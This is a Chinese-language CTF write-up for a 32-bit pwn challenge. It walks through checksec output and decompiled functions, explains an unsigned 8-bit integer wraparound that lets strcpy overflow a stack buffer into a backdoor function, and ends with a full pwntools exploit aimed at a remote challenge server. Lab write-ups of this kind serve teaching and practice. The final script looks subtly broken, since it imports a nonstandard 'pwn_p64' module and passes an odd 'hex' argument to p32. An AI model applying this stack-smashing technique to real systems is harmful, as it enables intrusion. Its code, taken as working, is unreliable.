1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# checksec int   
   [*] '/home/kali/Desktop/int'
       Arch:     i386-32-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x8048000)
   ```

   之开启了栈不可执行保护，栈溢出可以利用
2. IDA静态分析

   ```c
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     int v4; // [esp+Ch] [ebp-Ch] BYREF

     setbuf(stdin, 0);
     setbuf(stdout, 0);
     setbuf(stderr, 0);
     puts("---------------------");
     puts("~~ Welcome to CTF! ~~");
     puts("       1.Login       ");
     puts("       2.Exit        ");
     puts("---------------------");
     printf("Your choice:");
     __isoc99_scanf("%d", &v4);
     if ( v4 == 1 )
     {
       login();
     }
     else
     {
       if ( v4 == 2 )
       {
         puts("Bye~");
         exit(0);
       }
       puts("Invalid Choice!");
     }
     return 0;
   }
   ```

   main函数中无可利用的点，在看login函数

   ```c
   int login()
   {
     char buf[512]; // [esp+0h] [ebp-228h] BYREF
     char s[40]; // [esp+200h] [ebp-28h] BYREF

     memset(s, 0, 0x20u);
     memset(buf, 0, sizeof(buf));
     puts("Please input your username:");
     read(0, s, 0x19u);
     printf("Hello %s\n", s);
     puts("Please input your passwd:");
     read(0, buf, 0x199u);
     return check_passwd(buf);
   }
   ```

   所有的输入函数都做了长度限制，无法利用，继续寻找check_passwd函数的漏洞

   ```c
   char *__cdecl check_passwd(char *s)
   {
     char dest[11]; // [esp+4h] [ebp-14h] BYREF
     unsigned __int8 v3; // [esp+Fh] [ebp-9h]

     v3 = strlen(s);
     if ( v3 <= 3u || v3 > 8u )
     {
       puts("Invalid Password");
       return (char *)fflush(stdout);
     }
     else
     {
       puts("Success");
       fflush(stdout);
       return strcpy(dest, s);
     }
   }
   ```

   该函数定义了一个无符号8bit位的v3变量，给v3赋值为s字符数组的长度，看两个if分支，当长度大于3小于等于8时，登陆成功，调用strcpy函数，登陆失败的话什么也不做。strcpy函数，不遇到终止符00就不停止复制，没有长度限制，可以利用dest数组实现栈溢出，但被赋值的s字符数组长度只能介于4-8之间。可以利用无符号v3变量实现溢出。

   ```
   无符号整型的溢出。例如该题，v3内存所占8bit位：0x00000000
   将260赋值给v3时，先将v3转化成二进制：0001 0000 0100，根据v3所能容纳的大小，取后八个比特位赋值给v3，也就是0000 0100，也就是v3=4
   ```

   所以当给s字符数组赋值时输入260个字符，v3就被赋值为4，调用strcpy，将s数组的内容复制到dest数组，dest越界，返回地址被覆写，查找到函数列表中有what_is_this后门函数，就不用考虑ret2libc了，一个简单的ret2text
3. 利用：

   直接输20个填充字符a，用来填满栈，分析一下汇编代码，结尾是有一条leave指令的，这条指令的作用是将调用函数login的栈恢复，所以再填充4字节，接下来才是函数返回地址，四字节的what_is_this函数地址，然后再填充除00外的任意字符，这些字符总长度在260-264之间
4. 完整利用：

   ```python
   from pwn import *
   from pwn_p64 import *

   io = remote("61.147.171.105", 63971)
   payload = b'a' * 0x14 + b'a' * 4 + p32(0x0804868B, "hex") + (256 - 0x14 - 4 - 4) * b'a' + 4 * b'a'

   io.sendlineafter("Your choice:", "1")
   io.sendlineafter("Please input your username:", "wky")
   io.sendlineafter("Please input your passwd:", payload)

   io.interactive()
   ```
